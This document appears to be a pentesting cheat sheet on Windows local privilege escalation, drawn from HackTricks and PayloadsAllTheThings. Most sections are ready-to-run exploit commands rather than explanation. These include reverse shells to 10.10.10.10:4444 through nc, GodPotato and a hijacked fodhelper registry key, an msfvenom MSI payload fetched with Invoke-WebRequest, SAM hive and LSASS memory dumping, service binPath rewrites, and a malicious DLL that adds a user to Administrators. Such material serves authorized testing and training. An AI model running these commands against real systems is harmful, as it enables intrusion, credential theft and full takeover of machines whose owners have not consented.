## This technical guide covers most used and common privilege escalation vectors in Windows.

---

## 1. Service Misconfigurations

Windows services execute in the background under elevated security contexts, often `NT AUTHORITY\SYSTEM` or `NT AUTHORITY\LOCAL SERVICE`. When binary paths or service permissions are misconfigured, lower-privileged users can gain arbitrary code execution as `SYSTEM`.

### A. Unquoted Service Paths

* **Logic:** When Windows starts a service whose binary path contains spaces and is not wrapped in quotation marks, the Service Control Manager (SCM) parses the path sequentially. Windows interprets each space as a potential file execution boundary until it finds a matching binary.
* **Mechanism:** If a service path is `C:\Program Files\Development Tools\Service Manager\service.exe`, Windows attempts execution in the following order:
1. `C:\Program.exe`
2. `C:\Program Files\Development.exe`
3. `C:\Program Files\Development Tools\Service.exe`
4. `C:\Program Files\Development Tools\Service Manager\service.exe`


* **Enumeration:**
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\" | findstr /i /v """

```


PowerShell equivalent:
```powershell
Get-CimInstance -ClassName win32_service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'} | Select-Object Name, PathName, StartMode

```


* **Exploit Example:**
If write permissions exist in `C:\Program Files\Development Tools\`:
```cmd
copy C:\tmp\payload.exe "C:\Program Files\Development Tools\Service.exe"
sc stop VulnerableService
sc start VulnerableService

```


* **Source:** [HackTricks - Unquoted Service Paths](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation%23unquoted-service-paths) | [PayloadsAllTheThings - Unquoted Service Paths](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Windows%2520-%2520Privilege%2520Escalation.md%23eop---unquoted-service-paths)

---

### B. Insecure Service Binary Permissions

* **Logic:** The service path points to a binary where Discretionary Access Control Lists (DACLs) grant modify (`M`), write (`W`), or full control (`F`) access to low-privileged user groups (e.g., `BUILTIN\Users`, `EVERYONE`, or `Authenticated Users`).
* **Enumeration:**
```cmd
icacls "C:\Program Files\CustomApp\bin\service.exe"

```


Using Sysinternals `accesschk.exe`:
```cmd
accesschk.exe -qv "C:\Program Files\CustomApp\bin\service.exe"

```


* **Exploit Example:**
```cmd
# Overwrite original executable with reverse shell payload
copy /y C:\tmp\shell.exe "C:\Program Files\CustomApp\bin\service.exe"
sc stop CustomService
sc start CustomService

```


* **Source:** [PayloadsAllTheThings - Incorrect permissions in services](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Windows%2520-%2520Privilege%2520Escalation.md%23eop---incorrect-permissions-in-services)

---

### C. Weak Service Permissions (`sc config`)

* **Logic:** The SCM grants low-privileged accounts permission to reconfigure service attributes (specifically `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`). An attacker can alter the service's execution path (`binPath`) to execute arbitrary binaries upon restart.
* **Enumeration:**
```cmd
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -ucqv "Users" VulnerableService

```


* **Exploit Example:**
```cmd
# Change service binary path to an arbitrary command or executable
sc config VulnerableService binPath= "C:\tmp\nc.exe -e cmd.exe 10.10.10.10 4444"
sc config VulnerableService obj= "LocalSystem" password= ""
net stop VulnerableService
net start VulnerableService

```


* **Source:** [HackTricks - Insecure Service Permissions](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation%23services)

---

### D. Registry Service Path Modification (`ImagePath`)

* **Logic:** Service definitions are stored in the Windows Registry under `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`. If an attacker has write permissions over a service's registry key (`KEY_SET_VALUE` or `KEY_ALL_ACCESS`), they can directly modify the `ImagePath` parameter.
* **Enumeration:**
```cmd
accesschk.exe -kvcu "Users" HKLM\SYSTEM\CurrentControlSet\Services

```


* **Exploit Example:**
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "C:\tmp\payload.exe" /f
sc start VulnerableService

```


* **Source:** [HackTricks - Registry Services Modifications](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation%23services-registry-permissions)

---

## 2. Token Impersonation & Privileges (The Potato Family)

Windows uses Access Tokens to define the security context of running processes. If a service or account holds specific Windows privileges, an attacker can coerce elevated processes (`SYSTEM`) to authenticate against a local listener and steal/impersonate their access token.

### A. `SeImpersonatePrivilege` & `SeAssignPrimaryTokenPrivilege`

* **Logic:** Typically assigned to service accounts (e.g., `IIS APPPOOL\DefaultAppPool`, `LOCAL SERVICE`, `NETWORK SERVICE`). These privileges allow a thread to impersonate the security context of another user who connects to an IPC mechanism (such as Named Pipes or RPC) controlled by the attacker.
* **Enumeration:**
```cmd
whoami /priv

```


Look for:
```text
Privilege Name                Description                               Status
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled

```


* **Exploit Family & Tools:**
* **PrintSpoofer:** Exploits the Print Spooler service via `RpcOpenPrinter` to force a `SYSTEM` connection to an attacker-controlled named pipe.
```cmd
PrintSpoofer.exe -i -c cmd.exe

```


* **GodPotato:** Uses DCOM activation to coerce `SYSTEM` authentication via local HTTP/RPC, working across Windows 10, 11, and Server 2012–2022.
```cmd
GodPotato.exe -cmd "cmd.exe /c C:\tmp\nc.exe 10.10.10.10 4444 -e cmd"

```


* **RoguePotato:** Used when DCOM redirectors on newer Windows builds block local redirection, coercing authentication back to a fake rogue OXID Resolver.
```cmd
RoguePotato.exe -r 10.10.10.10 -e "C:\tmp\payload.exe" -l 9999

```




* **Source:** [HackTricks - Named Pipe Client Impersonation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation) | [PayloadsAllTheThings - Impersonation Privileges](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Windows%2520-%2520Privilege%2520Escalation.md%23eop---impersonation-privileges)

---

### B. `SeBackupPrivilege` & `SeRestorePrivilege`

* **Logic:** `SeBackupPrivilege` grants read access to all files on the system regardless of the file's DACL (bypassing standard NTFS read checks). `SeRestorePrivilege` grants write access to write files anywhere on the system regardless of permissions.
* **Enumeration:**
```cmd
whoami /priv

```


* **Exploit Walkthrough (Registry Hive Dumping):**
1. Export raw `SAM` and `SYSTEM` registry hives to a disk directory bypassing locked system files:
```cmd
reg save HKLM\SAM C:\tmp\sam.hive
reg save HKLM\SYSTEM C:\tmp\system.hive

```


2. Extract local administrator password hashes offline using `secretsdump.py`:
```bash
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL

```


3. Authenticate as local Administrator using Pass-the-Hash via `psexec.py` or `evil-winrm`.


* **Source:** [HackTricks - SeBackupPrivilege Exploitation](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

---

### C. `SeTakeOwnershipPrivilege` & `SeDebugPrivilege`

* **`SeTakeOwnershipPrivilege`:** Allows a user to claim ownership over any object (files, registry keys, services). Once owned, the user can modify DACLs to grant themselves full permissions (`takeown /f <file>` -> `icacls <file> /grant %username%:F`).
* **`SeDebugPrivilege`:** Allows attaching to and reading/writing memory of any process running on the system, including `lsass.exe`.
```powershell
# Dump LSASS memory directly via PowerShell/ProcDump
procdump.exe -ma lsass.exe C:\tmp\lsass.dmp

```


* **Source:** [Microsoft Docs - User Rights Assignment](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment)

---

## 3. Registry Misconfigurations & Installation Mechanics

### A. AlwaysInstallElevated

* **Logic:** If the `AlwaysInstallElevated` policy is enabled in both Machine (`HKLM`) and User (`HKCU`) registry keys, Windows Installer (`msiexec.exe`) executes `.msi` installation packages with elevated `NT AUTHORITY\SYSTEM` privileges.
* **Enumeration:**
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

```


Both keys must return a DWORD value of `0x1`.
* **Exploit Walkthrough:**

1. **Payload Generation:** Generate malicious MSI installer.
Create a standalone `.msi` reverse shell binary on your attack box using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o payload.msi

```


2. **Staging:** Transfer file to target host.
Download the installer onto the Windows machine:

```powershell
Invoke-WebRequest -Uri "http://10.10.10.10:8000/payload.msi" -OutFile "C:\Windows\Tasks\payload.msi"

```


3. **Execution:** Run installer via msiexec in quiet mode.
Execute the installer without a GUI interface:

```cmd
msiexec /quiet /qn /i C:\Windows\Tasks\payload.msi

```

The installer executes as `SYSTEM`, executing the payload context.


* **Source:** [PayloadsAllTheThings - AlwaysInstallElevated](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Windows%2520-%2520Privilege%2520Escalation.md%23eop---microsoft-windows-installer)

---

### B. Autoruns & Startup Applications

* **Logic:** Windows automatically launches binaries on system startup based on registry entries (e.g., `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`) or the global Startup folder. If low-privileged accounts can write to or overwrite these binaries, code executes under the context of whichever user logs in next (often Administrators or `SYSTEM`).
* **Enumeration:**
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
cmd /c dir "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

```


* **Exploit Example:**
```cmd
# Check permissions on identified AutoRun executables
icacls "C:\Program Files\AutoApp\updater.exe"
# Overwrite binary if writable
copy /y C:\tmp\payload.exe "C:\Program Files\AutoApp\updater.exe"

```


* **Source:** [HackTricks - Autorun Applications](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation%23autorun)

---

## 4. Credential Harvesting & Sensitive Files

Local credentials left in plain text, setup deployment files, or system caches provide direct administrative access or lateral pivot vectors.

### A. Unattended Installation Files

* **Logic:** System administrators or deployment scripts (like Sysprep, WDS, or automated deployment tools) store unattended XML setup files that contain base64-encoded or plain-text passwords for local Administrator accounts.
* **Enumeration Locations:**
* `C:\Windows\Panther\Unattend.xml`
* `C:\Windows\Panther\Unattended.xml`
* `C:\Windows\System32\sysprep\sysprep.xml`
* `C:\Windows\System32\sysprep\sysprep.inf`
* `C:\unattend.xml`


* **Exploit Example:**
```powershell
Get-ChildItem -Path C:\ -Include *unattend*.xml,*sysprep*.xml -File -Recurse -ErrorAction SilentlyContinue

```


Look for XML tags containing credentials:
```xml
<AutoLogon>
    <Password>
        <Value>cGFzc3dvcmQxMjM=</Value>
        <PlainText>true</PlainText>
    </Password>
    <Username>Administrator</Username>
</AutoLogon>

```


Decode base64 string:
```bash
echo "cGFzc3dvcmQxMjM=" | base64 -d

```


* **Source:** [PayloadsAllTheThings - Passwords in unattend.xml](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Windows%2520-%2520Privilege%2520Escalation.md%23passwords-in-unattendxml)

---

### B. AutoLogon Registry Passwords

* **Logic:** Systems configured to automatically sign in a designated user store credentials in plain text within the Windows Registry.
* **Enumeration:**
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon"

```


* **Source:** [HackTricks - AutoLogon Passwords](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation%23autologon)

---

### C. PowerShell History & Console Transcripts

* **Logic:** PowerShell v5+ logs interactive command entries into an execution history file per user. Users frequently pass cleartext passwords via command line arguments (`net user`, `ConvertTo-SecureString`).
* **Enumeration Path:**
`%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
* **Command:**
```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
Select-String -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Pattern "password","pass","net user","securestring"

```


* **Source:** [PayloadsAllTheThings - PowerShell History](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Windows%2520-%2520Privilege%2520Escalation.md%23powershell-history)

---

### D. Windows LAPS Passwords

* **Logic:** Local Administrator Password Solution (LAPS) manages and randomizes local administrator passwords across domain computers. If Active Directory permissions are misconfigured, low-privileged domain accounts can read the cleartext password attribute from AD computer objects.
* **Enumeration Attributes:**
* Legacy LAPS: `ms-Mcs-AdmPwd`
* Windows LAPS (Native): `msLAPS-Password`


* **Command (PowerShell Active Directory Module / LAPSToolkit):**
```powershell
Get-ADComputer -Identity "TARGET-PC" -Properties ms-Mcs-AdmPwd

```


* **Source:** [HackTricks - LAPS Abuse](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)

---

## 5. DLL Hijacking

When a Windows executable loads a Dynamic Link Library (DLL), it searches specific system directories in a pre-defined order unless the binary uses an absolute path or safe DLL loading is strictly enforced.

### A. DLL Search Order Hijacking

* **Standard Windows DLL Search Order:**
1. The directory from which the application loaded.
2. The system directory (`C:\Windows\System32`).
3. The 16-bit system directory (`C:\Windows\System`).
4. The Windows directory (`C:\Windows`).
5. The current working directory.
6. Directories listed in the system `%PATH%` environment variable.


* **Logic:** If an application running with elevated privileges attempts to load a non-existent DLL from a directory where a low-privileged user has write permissions, dropping a malicious DLL with the expected name forces the application to execute arbitrary code.
* **Enumeration Workflow:**
1. Monitor execution of elevated applications using Sysinternals `ProcMon.exe`.
2. Set Filters: `Result contains NOT FOUND`, `Path ends with .dll`.
3. Identify missing DLLs loaded from writable user directories.


* **Exploit Code Template (C/C++ Malicious DLL):**
```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            WinExec("cmd.exe /c net localgroup Administrators lowprivuser /add", SW_HIDE);
            break;
    }
    return TRUE;
}

```


Compile DLL:
```bash
x86_64-w64-mingw32-gcc -shared -o hijack.dll payload.c

```


* **Source:** [PayloadsAllTheThings - DLL Hijacking](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Windows%2520-%2520Privilege%2520Escalation.md%23eop---dll-hijacking)

---

### B. PATH Environment Variable Interception

* **Logic:** If a system-wide `%PATH%` directory is writable by low-privileged accounts (e.g., legacy custom software paths like `C:\PHP\bin`), placing a malicious DLL or executable into that directory causes elevated applications to execute it over legitimate system binaries if placed earlier in the search path.
* **Enumeration:**
```cmd
echo %PATH%
icacls "C:\WritablePathInPath"

```


* **Source:** [HackTricks - DLL Hijacking & PATH Interception](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)

---

## 6. Group Memberships & User Rights Assignments

Belonging to specific local or domain groups confers special OS capabilities that lead directly to SYSTEM compromise.

### A. Local Administrators (UAC Bypass)

* **Logic:** Members of the local `Administrators` group operate under a split-token environment when User Account Control (UAC) is enabled. Medium Integrity shells must bypass UAC to elevate to High Integrity (`NT AUTHORITY\SYSTEM` or full Admin privileges).
* **Enumeration:**
```cmd
whoami /groups

```


* **UAC Bypass Vector Example (Fodhelper / ComputerDefaults):**
Auto-elevated Windows binaries (like `fodhelper.exe`) trust user registry paths in `HKCU\Software\Classes\ms-settings\shell\open\command` without issuing a consent prompt.
```cmd
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /d "cmd.exe /c C:\tmp\nc.exe 10.10.10.10 4444 -e cmd" /f
fodhelper.exe

```


* **Source:** [HackTricks - User Account Control (UAC) Bypasses](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control)

---

### B. Backup Operators Group

* **Logic:** Members can back up and restore all files regardless of ACL permissions.
* **Exploit Command:**
```cmd
# Dump system registry hives using built-in robocopy/reg
reg save HKLM\SAM C:\Users\Public\sam
reg save HKLM\SYSTEM C:\Users\Public\system

```


* **Source:** [HackTricks - Backup Operators Group](https://www.google.com/search?q=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/interesting-groups-vulnerability-agents)

---

### C. Server Operators / Hyper-V Administrators

* **Server Operators:** Can start and stop system services. Change a service `binPath` to get `SYSTEM` access.
* **Hyper-V Administrators:** Can create virtual machines, clone existing system drives, and mount the virtual hard disks (`.vhdx`) to extract local hashes or inject startup scripts.

---

## 7. Kernel Exploitation & Vulnerable Drivers

Kernel exploits target vulnerabilities in the core Windows OS kernel (`ntoskrnl.exe`), subsystem drivers (`win32k.sys`), or third-party drivers to elevate directly to `NT AUTHORITY\SYSTEM`.

### Notable Windows Kernel & Subsystem Vulnerabilities

| Name / CVE | Affected Versions | Vulnerability Class | Description |
| --- | --- | --- | --- |
| **HiveNightmare / SeriousSAM** (CVE-2021-36934) | Windows 10 (1809-21H1) | Insecure ACLs | Overly permissive DACLs on `C:\Windows\System32\config\SAM` allow non-admin users to read SAM/SYSTEM backup shadow copies. |
| **PrintNightmare** (CVE-2021-34527) | Windows Server / Win 10 | RCE / LPE in Spooler | Privilege escalation via `RPRN` RPC interface loading remote driver DLLs. |
| **CLFS Driver Exploits** (CVE-2023-28252) | Windows 10 / 11 / Server | Out-of-Bounds Write | Exploits Common Log File System (`clfs.sys`) driver to overwrite token privileges in kernel memory. |
| **Windows Ancillary Function Driver** (CVE-2023-21768) | Windows 11 22H2 | Double Free / Arbitrary Write | Exploit in `afd.sys` driver allows rewriting current process token to copy `SYSTEM` privileges. |

### Bring Your Own Vulnerable Driver (BYOVD)

* **Logic:** Administrators can load signed third-party drivers. Attackers who possess administrator rights (or an execution context that allows driver loading) intentionally load a legitimately signed, vulnerable driver (e.g., `RTCore64.sys`) to disable Endpoint Detection and Response (EDR) agents or write directly into kernel memory structures.
* **Source:** [Exploit-DB Windows Local Exploits](https://www.exploit-db.com/) | [LJS Kernel Privilege Escalation Collection](https://github.com/SecWiki/windows-kernel-exploits)

---

## 8. Automated Vector Analyzers Guide

Automated scripts streamline the enumeration process by scanning services, registry keys, permissions, tasks, and patches for known misconfigurations.

### Primary Automation Tools

| Tool | Primary Language | Ideal Environment | Key Capabilities |
| --- | --- | --- | --- |
| **WinPEAS** | C# Binary / Batch | Modern Windows 10/11 & Servers | Comprehensive system scan, privilege checks, color-coded findings. |
| **PrivescCheck** | PowerShell | Legacy & Restricted Envs | Pure PowerShell module requiring no binary drops on disk. |
| **PowerUp** | PowerShell | Legacy Pentesting | Automation tool focusing on services, registry, and DLL hijack checks. |
| **SharpUp** | C# | Offensive Red Team Ops | C# port of PowerUp designed for in-memory execution via C2 frameworks. |

---

### WinPEAS Execution & Output Guide

WinPEAS (`winPEASx64.exe`) is the primary automated auditing tool for Windows environments.

#### 1. Transfer & Execution Methods

* **Method A: Direct PowerShell Download & Execute**
```powershell
Invoke-WebRequest -Uri "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile "C:\Windows\Tasks\winPEASx64.exe"
C:\Windows\Tasks\winPEASx64.exe

```


* **Method B: Fileless Execution via C2 / Cobalt Strike / PowerShell**
Load and run in memory without touching disk using PowerShell wrappers or reflective PE injection.

#### 2. WinPEAS Color Palette Interpretation

WinPEAS relies on an explicit color hierarchy to highlight actionable vectors:

* **RED / YELLOW Background:** Indicates a **99% confirmed privilege escalation vector**. Examples include: `AlwaysInstallElevated` enabled, stored cleartext passwords, writable service binaries running as SYSTEM.
* **RED:** Important security configuration issue or credential finding.
* **GREEN:** Explicitly protected or standard secure configuration.
* **BLUE:** General system information, running processes, network connections.

#### 3. Focused Execution Commands

To reduce output volume and bypass time-consuming deep scans:

```cmd
# Fast Mode: Skip file searches and slow structural searches
winPEASx64.exe fast

# Run specific domain checks (e.g., Services and Credentials)
winPEASx64.exe servicesinfo quiet
winPEASx64.exe userinfo

# Save colorized output to log file for analysis
winPEASx64.exe log=winpeas.txt

```

---

### Running PrivescCheck (PowerShell Native)

For environments where executing unvalidated C# binaries is blocked by AppLocker, run `PrivescCheck.ps1`:

```powershell
# Bypass Execution Policy and Import Script
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module .\PrivescCheck.ps1

# Run full audit and export to HTML report
Invoke-PrivescCheck -Extended -Report PrivescReport

```

* **Sources:**
* [WinPEAS Official Repository](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
* [PrivescCheck Official Repository](https://github.com/itm4n/PrivescCheck)
* [PowerUp (PowerSploit) Repository](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
